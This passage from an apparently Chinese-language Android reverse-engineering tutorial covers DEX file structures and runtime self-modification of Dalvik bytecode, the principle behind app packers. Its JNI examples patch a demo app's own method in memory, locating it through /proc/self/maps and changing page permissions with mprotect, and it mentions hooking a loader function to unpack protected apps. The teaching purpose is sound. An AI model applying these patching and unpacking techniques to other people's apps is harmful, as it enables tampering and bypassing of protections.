size;              <span class="comment">/* count of items of the indicated type */</span></span><br><span class="line">    u4 offset;            <span class="comment">/* file offset to the start of data */</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Direct-mapped "map_list".</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">DexMapList</span> &#123;</span></span><br><span class="line">    u4  size;               <span class="comment">/* #of entries in list */</span></span><br><span class="line">    DexMapItem <span class="built_in">list</span>[<span class="number">1</span>];     <span class="comment">/* entries */</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Direct-mapped "class_def_item".</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">DexClassDef</span> &#123;</span></span><br><span class="line">    u4  classIdx;           <span class="comment">/* index into typeIds for this class */</span></span><br><span class="line">    u4  accessFlags;</span><br><span class="line">    u4  superclassIdx;      <span class="comment">/* index into typeIds for superclass */</span></span><br><span class="line">    u4  interfacesOff;      <span class="comment">/* file offset to DexTypeList */</span></span><br><span class="line">    u4  sourceFileIdx;      <span class="comment">/* index into stringIds for source file name */</span></span><br><span class="line">    u4  annotationsOff;     <span class="comment">/* file offset to annotations_directory_item */</span></span><br><span class="line">    u4  classDataOff;       <span class="comment">/* file offset to class_data_item */</span></span><br><span class="line">    u4  staticValuesOff;    <span class="comment">/* file offset to DexEncodedArray */</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Link table.  Currently undefined.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">DexLink</span> &#123;</span></span><br><span class="line">    u1  bleargh;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h1 id="动态代码自修改（加壳原理）"><a href="#动态代码自修改（加壳原理）" class="headerlink" title="动态代码自修改（加壳原理）"></a>动态代码自修改（加壳原理）</h1><p>DexClassDef -&gt; DexClassData -&gt; DexMethod -&gt; DexCode -&gt; insns</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Direct-mapped "code_item".</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * The "catches" table is used when throwing an exception,</span></span><br><span class="line"><span class="comment"> * "debugInfo" is used when displaying an exception stack trace or</span></span><br><span class="line"><span class="comment"> * debugging. An offset of zero indicates that there are no entries.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">DexCode</span> &#123;</span></span><br><span class="line">    u2  registersSize;      <span class="comment">// 使用的寄存器个数</span></span><br><span class="line">    u2  insSize;            <span class="comment">// 参数个数</span></span><br><span class="line">    u2  outsSize;           <span class="comment">// 调用其他方法时使用的寄存器个数</span></span><br><span class="line">    u2  triesSize;          <span class="comment">// Try/Catch的个数</span></span><br><span class="line">    u4  debugInfoOff;       <span class="comment">// 指令调试信息的偏移 /* file offset to debug info stream */</span></span><br><span class="line">    u4  insnsSize;          <span class="comment">// 指令集个数，以2字节为单位 /* size of the insns array, in u2 units */</span></span><br><span class="line">    u2  insns[<span class="number">1</span>];           <span class="comment">// 指令集</span></span><br><span class="line">    <span class="comment">/* followed by optional u2 padding */</span></span><br><span class="line">    <span class="comment">/* followed by try_item[triesSize] */</span></span><br><span class="line">    <span class="comment">/* followed by uleb128 handlersSize */</span></span><br><span class="line">    <span class="comment">/* followed by catch_handler_item[handlersSize] */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>其中，insns 的值是用于存放程序实现代码的地方。程序执行的时候会把整个 dex 文件加载到内存之中，然后动态地解析执行 insns 中的内容。只要修改了里面的数据，就相当于修改了程序执行流程。</p><h2 id="修改-insns"><a href="#修改-insns" class="headerlink" title="修改 insns"></a>修改 insns</h2><h3 id="直接在内存中修改"><a href="#直接在内存中修改" class="headerlink" title="直接在内存中修改"></a>直接在内存中修改</h3><ol><li>定位到 dex 文件</li><li>计算函数的 DexCode 位置</li><li>重写 DexCode 的 insns 数据</li></ol><h4 id="JNI-Bridge"><a href="#JNI-Bridge" class="headerlink" title="JNI Bridge"></a><a href="http://androidxref.com/4.1.1/xref/dalvik/vm/Jni.cpp" target="_blank" rel="noopener">JNI Bridge</a></h4><p>JNI 提供了让我们在 C++代码层中直接操作 Dalvik（Java）数据的接口，可以直接在 JNI 中操作相关数据来修改 Android 中的代码。</p><h4 id="Object-结构体"><a href="#Object-结构体" class="headerlink" title="Object 结构体"></a><a href="http://androidxref.com/4.1.1/xref/dalvik/vm/oo/Object.cpp" target="_blank" rel="noopener">Object 结构体</a></h4><p>Android 运行时，解析 dex 文件，并生成相关的结构体：<a href="http://androidxref.com/4.1.1/xref/dalvik/vm/DvmDex.cpp" target="_blank" rel="noopener">DvmDex</a>。其中存储了各种字符串、类、方法等信息。加载的时候，调用 <code>dvmDexFileOpenPartial</code> 对 dex 文件进行解析，并转化为可执行的结构体，这也是这个函数可以作为脱壳用的函数的原因之一。（以前的爱加密可以直接通过 Hook 这个函数进行脱壳）。</p><p>其中 Method 结构体是根据 DexMethod 生成的执行方法类。Dalvik 执行代码时，都是从 Method 中取出代码来执行的。因此可以直接通过操作 Method 结构体来修改执行的代码。</p><h4 id="Example"><a href="#Example" class="headerlink" title="Example"></a>Example</h4><p>首先新建一个 JNI 项目，并新建两个函数 <code>ret1()</code> 和 <code>ret2()</code> 函数，以及一个 Native 函数 <code>changeMethod()</code>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.assassinq.editdexfile;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.google.android.material.floatingactionbutton.FloatingActionButton;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> androidx.appcompat.app.AppCompatActivity;</span><br><span class="line"><span class="keyword">import</span> androidx.appcompat.widget.Toolbar;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.util.Log;</span><br><span class="line"><span class="keyword">import</span> android.view.View;</span><br><span class="line"><span class="keyword">import</span> android.view.Menu;</span><br><span class="line"><span class="keyword">import</span> android.view.MenuItem;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">AppCompatActivity</span> </span>&#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        System.loadLibrary(<span class="string">"hello"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">        Toolbar toolbar = findViewById(R.id.toolbar);</span><br><span class="line">        setSupportActionBar(toolbar);</span><br><span class="line"></span><br><span class="line">        FloatingActionButton fab = findViewById(R.id.fab);</span><br><span class="line">        fab.setOnClickListener(<span class="keyword">new</span> View.OnClickListener() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span> </span>&#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    Method m = MainActivity.class.getMethod(<span class="string">"ret1"</span>);</span><br><span class="line">                    Log.d(<span class="string">"DEBUG"</span>, <span class="string">"Return Value = "</span> + ret1());</span><br><span class="line">                    changeMethod(m);</span><br><span class="line">                    Log.d(<span class="string">"DEBUG"</span>, <span class="string">"Return Value = "</span> + ret1());</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line"><span class="comment">//                    e.printStackTrace();</span></span><br><span class="line">                    Log.d(<span class="string">"EXCEPTION"</span>, Log.getStackTraceString(e));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">onCreateOptionsMenu</span><span class="params">(Menu menu)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// Inflate the menu; this adds items to the action bar if it is present.</span></span><br><span class="line">        getMenuInflater().inflate(R.menu.menu_main, menu);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">onOptionsItemSelected</span><span class="params">(MenuItem item)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// Handle action bar item clicks here. The action bar will</span></span><br><span class="line">        <span class="comment">// automatically handle clicks on the Home/Up button, so long</span></span><br><span class="line">        <span class="comment">// as you specify a parent activity in AndroidManifest.xml.</span></span><br><span class="line">        <span class="keyword">int</span> id = item.getItemId();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//noinspection SimplifiableIfStatement</span></span><br><span class="line">        <span class="keyword">if</span> (id == R.id.action_settings) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">super</span>.onOptionsItemSelected(item);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">ret1</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">ret2</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// public native void changeMethod(Method r1);</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>先编译生成一个不包含 JNI 的 apk，解压后取出其中的 classes.dex，然后在 010 Editor 中用 DEX Template 解析，找到 DexCode 中的 insns，并记录下 <code>ret1()</code> 和 <code>ret2()</code> 的字节码：</p><p><img src="/pics/Android逆向入门/四/3.png" alt="两个函数的字节码"></p><p>然后完善 JNI 函数，并且需要导入 Android 源码中 Dalvik 文件夹下相关的头文件。JNI 实现如下，将 <code>ret1()</code> 所指向的字节码修改为 <code>ret2()</code> 的字节码：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;jni.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;android/log.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"Object.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"Common.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> LOG_TAG</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LOGD(...) __android_log_print(ANDROID_LOG_DEBUG, LOG_TAG, __VA_ARGS__)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LOGI(...) __android_log_print(ANDROID_LOG_INFO, LOG_TAG, __VA_ARGS__)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LOGW(...) __android_log_print(ANDROID_LOG_WARN, LOG_TAG, __VA_ARGS__)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LOGE(...) __android_log_print(ANDROID_LOG_ERROR, LOG_TAG, __VA_ARGS__)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LOGF(...) __android_log_print(ANDROID_LOG_FATAL, LOG_TAG, __VA_ARGS__)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> insns[] = &#123;<span class="number">0x12</span>, <span class="number">0x20</span>, <span class="number">0x0F</span>, <span class="number">0x00</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">changeMethod</span><span class="params">(JNIEnv *env, jobject obj, jobject method)</span> </span>&#123;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 12 10 0F 00 -&gt; ret 1</span></span><br><span class="line"><span class="comment">     * 12 20 0F 00 -&gt; ret 2</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    Method *pMethod = (Method *) env-&gt;FromReflectedMethod(method);</span><br><span class="line">    pMethod-&gt;insns = (<span class="keyword">const</span> u2*) insns;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">registerNativeMethods</span><span class="params">(JNIEnv *env, <span class="keyword">const</span> <span class="keyword">char</span> *className, JNINativeMethod *gMethods,</span></span></span><br><span class="line"><span class="function"><span class="params">                                 <span class="keyword">int</span> numMethods)</span> </span>&#123;</span><br><span class="line">    jclass clazz;</span><br><span class="line">    clazz = env-&gt;FindClass(className);</span><br><span class="line">    <span class="keyword">if</span> (clazz == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> JNI_FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (env-&gt;RegisterNatives(clazz, gMethods, numMethods) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> JNI_FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> JNI_TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="keyword">char</span> *gClassName = <span class="string">"com/assassinq/editdexfile/MainActivity"</span>;</span><br><span class="line"><span class="keyword">static</span> JNINativeMethod gMethods[] = &#123;</span><br><span class="line">        &#123;<span class="string">"changeMethod"</span>, <span class="string">"(Ljava/lang/reflect/Method;)V"</span>, (<span class="keyword">void</span> *) changeMethod&#125;,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function">JNIEXPORT jint <span class="title">JNI_OnLoad</span><span class="params">(JavaVM *vm, <span class="keyword">void</span> *reserved)</span> </span>&#123;</span><br><span class="line">    JNIEnv *env = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">if</span> (vm-&gt;GetEnv((<span class="keyword">void</span> **) &amp;env, JNI_VERSION_1_6) != JNI_OK) &#123;</span><br><span class="line">        LOGE(<span class="string">"This jni version is not supported"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (registerNativeMethods(env, gClassName, gMethods, <span class="keyword">sizeof</span>(gMethods) / <span class="keyword">sizeof</span>(gMethods[<span class="number">0</span>])) ==</span><br><span class="line">        JNI_FALSE) &#123;</span><br><span class="line">        LOGE(<span class="string">"Unable to register native methods"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    LOGE(<span class="string">"Methods loaded successfully"</span>);</span><br><span class="line">    <span class="keyword">return</span> JNI_VERSION_1_6;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行程序并点击触发事件，查看日志发现修改生效：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">02-11 11:29:39.202 1795-1795/com.assassinq.editdexfile D/DEBUG: Return Value = 1</span><br><span class="line">02-11 11:29:39.202 1795-1795/com.assassinq.editdexfile D/DEBUG: Return Value = 2</span><br></pre></td></tr></table></figure><h3 id="IDA-中动态修改"><a href="#IDA-中动态修改" class="headerlink" title="IDA 中动态修改"></a>IDA 中动态修改</h3><ol><li>Ctrl+s 打开 map 数据</li><li>查找内存加载的额 classes.dex 的位置</li><li>直接计算偏移，修改相应的位置</li></ol><h3 id="内存修改的另一种方法"><a href="#内存修改的另一种方法" class="headerlink" title="内存修改的另一种方法"></a>内存修改的另一种方法</h3><p>修改方法定位：dexClassDef 遍历以获取 MethodId，对比 MethodName 与 proto 以获取目标 Method，然后对相应的 DexCode 进行修改。由于 Dex 加载到内存中是只有只读权限，故需要先修改内存页的权限才能正常地修改 DexCode 数据。</p><p>遍历 Map：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">get_module_base</span><span class="params">(<span class="keyword">pid_t</span> pid, <span class="keyword">const</span> <span class="keyword">char</span> *module_name)</span> </span>&#123;</span><br><span class="line">    FILE *fp;</span><br><span class="line">    <span class="keyword">long</span> addr = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">char</span> *pch;</span><br><span class="line">    <span class="keyword">char</span> filename[<span class="number">32</span>];</span><br><span class="line">    <span class="keyword">char</span> line[<span class="number">1024</span>];</span><br><span class="line">    <span class="keyword">if</span> (pid &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">snprintf</span>(filename, <span class="keyword">sizeof</span>(filename), <span class="string">"/proc/self/maps"</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">snprintf</span>(filename, <span class="keyword">sizeof</span>(filename), <span class="string">"/proc/%d/maps"</span>, pid);</span><br><span class="line">    &#125;</span><br><span class="line">    fp = fopen(filename, <span class="string">"r"</span>);</span><br><span class="line">    <span class="keyword">if</span> (fp != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="keyword">while</span> (fgets(line, <span class="keyword">sizeof</span>(line), fp)) &#123;</span><br><span class="line">            LOGD(<span class="string">"%s"</span>, line);</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">strstr</span>(line, module_name)) &#123;</span><br><span class="line">                pch = strtok(line, <span class="string">"-"</span>);</span><br><span class="line">                addr = strtoul(pch, <span class="literal">NULL</span>, <span class="number">16</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        fclose(fp);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">void</span> *) addr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>重置 Map 属性：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;asm-generic/mman-common.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;limits.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (mprotect(PAGE_START((<span class="keyword">int</span>)(pCode-&gt;insns)), PAGE_SIZE, PROT_READ | PROT_WRITE | PROT_EXEC) == <span class="number">0</span>) &#123;</span><br><span class="line">    *(u4 *)(pCode-&gt;insns) = <span class="number">0x000f2012</span>;</span><br><span class="line">    mprotect(PAGE_START((<span class="keyword">int</span>)(pCode-&gt;insns)), PAGE_SIZE, PROT_READ | PROT_WRITE | PROT_EXEC);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="Example-1"><a href="#Example-1" class="headerlink" title="Example"></a>Example</h4><p>接下来编写 changeMethod2 函数，利用 dalvik 中的一些函数来逐步定位到指定函数：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">changeMethod2</span><span class="params">(JNIEnv *env, jobject obj)</span> </span>&#123;</span><br><span class="line">    u1 *pDex = (u1 *) get_module_base(<span class="number">-1</span>, <span class="string">"/data/dalvik-cache/data@app@com.assassinq.editdexfile"</span>);</span><br><span class="line">    <span class="keyword">if</span> (pDex != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        LOGD(<span class="string">"Get Module"</span>);</span><br><span class="line">        pDex += <span class="keyword">sizeof</span>(DexOptHeader);</span><br><span class="line">        DexFile *pDexFile = dexFileParse(pDex, <span class="keyword">sizeof</span>(DexHeader), kDexParseContinueOnError);</span><br><span class="line">        <span class="keyword">if</span> (pDexFile == <span class="literal">NULL</span>) &#123;</span><br><span class="line">            LOGE(<span class="string">"Unable to parse DexFile"</span>);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">const</span> DexClassDef *pClassDef;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; pDexFile-&gt;pHeader-&gt;classDefsSize; ++i) &#123;</span><br><span class="line">            <span class="keyword">const</span> DexClassDef *pDef = dexGetClassDef(pDexFile, i);</span><br><span class="line">            <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(dexStringByTypeIdx(pDexFile, pDef-&gt;classIdx),</span><br><span class="line">                        <span class="string">"Lcom/assassinq/editdexfile/MainActivity;"</span>)) &#123;</span><br><span class="line">                pClassDef = pDef;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (pClassDef != <span class="literal">NULL</span>) &#123;</span><br><span class="line">            LOGD(<span class="string">"Class Found"</span>);</span><br><span class="line">            <span class="keyword">const</span> u1 *pData = dexGetClassData(pDexFile, pClassDef);</span><br><span class="line">            <span class="keyword">if</span> (pData) &#123;</span><br><span class="line">                DexClassData *pClassData = dexReadAndVerifyClassData(&amp;pData, <span class="literal">NULL</span>);</span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; pClassData-&gt;header.virtualMethodsSize; ++i) &#123;</span><br><span class="line">                    DexMethod *pMethod = &amp;pClassData-&gt;virtualMethods[i];</span><br><span class="line">                    <span class="keyword">const</span> DexMethodId *pMethodId = dexGetMethodId(pDexFile, pMethod-&gt;methodIdx);</span><br><span class="line">                    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(dexStringById(pDexFile, pMethodId-&gt;nameIdx), <span class="string">"ret1"</span>)) &#123;</span><br><span class="line">                        <span class="keyword">const</span> DexCode *pCode = dexGetCode(pDexFile, pMethod);</span><br><span class="line">                        LOGD(<span class="string">"Method found and try to patch"</span>);</span><br><span class="line">                        <span class="keyword">if</span> (mprotect((<span class="keyword">void</span> *) PAGE_START((<span class="keyword">int</span>) (pCode-&gt;insns)), PAGE_SIZE,</span><br><span class="line">                                     PROT_READ | PROT_WRITE) == <span class="number">0</span>) &#123;</span><br><span class="line">                            *(u4 *) (pCode-&gt;insns) = <span class="number">0x000F2012</span>;</span><br><span class="line">                            mprotect((<span class="keyword">void</span> *) PAGE_START((<span class="keyword">int</span>) (pCode-&gt;insns)), PAGE_SIZE,</span><br><span class="line">                                     PROT_READ);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="built_in">free</span>(pClassData);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        dexFileFree(pDexFile);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> JNINativeMethod gMethods[] = &#123;</span><br><span class="line">        ...</span><br><span class="line">        &#123;<span class="string">"changeMethod2"</span>, <span class="string">"()V"</span>,                           (<span class="keyword">void</span> *) 